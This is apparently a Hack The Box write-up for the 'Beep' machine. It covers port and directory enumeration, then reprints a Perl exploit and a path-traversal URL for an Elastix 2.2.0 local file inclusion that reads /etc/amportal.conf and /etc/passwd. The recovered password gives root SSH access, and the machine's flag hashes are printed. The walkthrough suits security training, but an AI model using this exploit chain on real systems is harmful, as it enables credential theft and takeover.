# BEEP

## ENUMERATION

Nmap scan gives the following result

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/beep]
└─$ nmap 10.10.10.7 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-05 05:51 EDT
Nmap scan report for 10.10.10.7
Host is up (0.12s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
443/tcp   open  https
993/tcp   open  imaps
995/tcp   open  pop3s
3306/tcp  open  mysql
4445/tcp  open  upnotifyp
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 29.03 seconds

┌──(kali㉿kali)-[~/Downloads/hackthebox/beep]
└─$ nmap 10.10.10.7 -p 22,25,80,110,111,143,993,995,3306,4445,10000 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-05 05:53 EDT
Nmap scan report for 10.10.10.7
Host is up (0.43s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: TOP USER IMPLEMENTATION(Cyrus POP3 server v2) LOGIN-DELAY(0) RESP-CODES UIDL STLS PIPELINING EXPIRE(NEVER) AUTH-RESP-CODE APOP
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            876/udp   status
|_  100024  1            879/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: SORT=MODSEQ NO UNSELECT SORT URLAUTHA0001 X-NETSCAPE QUOTA THREAD=ORDEREDSUBJECT LIST-SUBSCRIBED IMAP4rev1 CHILDREN IDLE THREAD=REFERENCES CATENATE ANNOTATEMORE CONDSTORE BINARY OK LISTEXT ATOMIC MULTIAPPEND ACL LITERAL+ Completed UIDPLUS MAILBOX-REFERRALS RENAME STARTTLS RIGHTS=kxte IMAP4 ID NAMESPACE
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 455.13 seconds


Running the gobuster scan
```

I ran gobuster with the common.txt wordlist

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/beep]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u https://10.10.10.7/ -q -k
/.hta                 (Status: 403) [Size: 282]
/.htpasswd            (Status: 403) [Size: 287]
/.htaccess            (Status: 403) [Size: 287]
/admin                (Status: 301) [Size: 309] [--> https://10.10.10.7/admin/]
/cgi-bin/             (Status: 403) [Size: 286]                                
/configs              (Status: 301) [Size: 311] [--> https://10.10.10.7/configs/]
/favicon.ico          (Status: 200) [Size: 894]                                  
/help                 (Status: 301) [Size: 308] [--> https://10.10.10.7/help/]   
/images               (Status: 301) [Size: 310] [--> https://10.10.10.7/images/] 
/index.php            (Status: 200) [Size: 1785]                                 
/lang                 (Status: 301) [Size: 308] [--> https://10.10.10.7/lang/]   
/libs                 (Status: 301) [Size: 308] [--> https://10.10.10.7/libs/]   
/mail                 (Status: 301) [Size: 308] [--> https://10.10.10.7/mail/]   
/modules              (Status: 301) [Size: 311] [--> https://10.10.10.7/modules/]
/panel                (Status: 301) [Size: 309] [--> https://10.10.10.7/panel/]  
/robots.txt           (Status: 200) [Size: 28]                                   
/static               (Status: 301) [Size: 310] [--> https://10.10.10.7/static/] 
/themes               (Status: 301) [Size: 310] [--> https://10.10.10.7/themes/] 
/var                  (Status: 301) [Size: 307] [--> https://10.10.10.7/var/] 
```

Again nothing that can be useful

Opening the webpage on port 80 we find a login page of elastix but we do not have the username and password yet
Using searchsploit to search for exploits for elastix

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/beep]
└─$ searchsploit elastix                         
----------------------------------------------- ---------------------------------
 Exploit Title                                 |  Path
----------------------------------------------- ---------------------------------
Elastix - 'page' Cross-Site Scripting          | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulner | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting  | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusi | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection              | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection             | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code E | php/webapps/18650.py
----------------------------------------------- ---------------------------------
Shellcodes: No Results

```

The local file inclusion exploit is what we need as the machine also had a tag lfi

## EXPLOIT

Reading the exploit

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/beep]
└─$ cat 37637.pl                                                           255 ⨯
#!/usr/bin/perl -w
source: https://www.securityfocus.com/bid/55078/info

Elastix is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to view files and execute local scripts in the context of the web server process. This may aid in further attacks.

Elastix 2.2.0 is vulnerable; other versions may also be affected. 


#------------------------------------------------------------------------------------# 
#Elastix is an Open Source Sofware to establish Unified Communications. 
#About this concept, Elastix goal is to incorporate all the communication alternatives,
#available at an enterprise level, into a unique solution.
#------------------------------------------------------------------------------------#
############################################################
# Exploit Title: Elastix 2.2.0 LFI
# Google Dork: :(
# Author: cheki
# Version:Elastix 2.2.0
# Tested on: multiple
# CVE : notyet
# romanc-_-eyes ;) 
# Discovered by romanc-_-eyes
# vendor http://www.elastix.org/

print "\t Elastix 2.2.0 LFI Exploit \n";
print "\t code author cheki   \n";
print "\t 0day Elastix 2.2.0  \n";
print "\t email: anonymous17hacker{}gmail.com \n";

#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

use LWP::UserAgent;
print "\n Target: https://ip ";
chomp(my $target=<STDIN>);
$dir="vtigercrm";
$poc="current_language";
$etc="etc";
$jump="../../../../../../../..//";
$test="amportal.conf%00";

$code = LWP::UserAgent->new() or die "inicializacia brauzeris\n";
$code->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$host = $target . "/".$dir."/graph.php?".$poc."=".$jump."".$etc."/".$test."&module=Accounts&action";
$res = $code->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~ 'This file is part of FreePBX') {
 
print "\n read amportal.conf file : $answer \n\n";
print " successful read\n";
 
}
else { 
print "\n[-] not successful\n";
        }       
```
The line ```#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action``` is what we need

On using the url ```https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action``` we are able to read the file 

Well the webpage is quite messy so I read the source page with ```CTRL+U```

On this page we find several usernames and passwords

```
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE
#FOPPASSWORD=passw0rd
FOPPASSWORD=jEhdIekWmdjE
```

Also now that we can read file I also read the ```passwd``` file with the url ```https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action```

On this page we find even more usernames

```
root:x:0:0:root:/root:/bin/bash
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
spamfilter:x:500:500::/home/spamfilter:/bin/bash
fanis:x:501:501::/home/fanis:/bin/bash
```

## SSH

I tried to ssh into the machine but I ran into the following error
```
┌──(kali㉿kali)-[~/Downloads/hackthebox/beep]
└─$ ssh root@10.10.10.7                                                    255 ⨯
Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```

This can be easily solved by using this command ```ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7 ```

After a little trial and error we find the correct user and password
```
user : root
password : jEhdIekWmdjE
```
And we are in the machine as root

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/beep]
└─$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7        255 ⨯
The authenticity of host '10.10.10.7 (10.10.10.7)' can't be established.
RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.7' (RSA) to the list of known hosts.
root@10.10.10.7's password: 
Last login: Tue Jul 16 11:45:47 2019

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]# whoami
root
[root@beep ~]# cd /root
[root@beep ~]# ls
anaconda-ks.cfg            install.log.syslog  webmin-1.570-1.noarch.rpm
elastix-pr-2.2-1.i386.rpm  postnochroot
install.log                root.txt
[root@beep ~]# cat root.txt
31cdb2b54e5b416d8a6cdf7d339bd64f
[root@beep ~]# cd /home
[root@beep home]# ls
fanis  spamfilter
[root@beep home]# cd fanis
[root@beep fanis]# ls
user.txt
[root@beep fanis]# cat user.txt
124c3d14a0f6ee7c98920fda233ee919
```
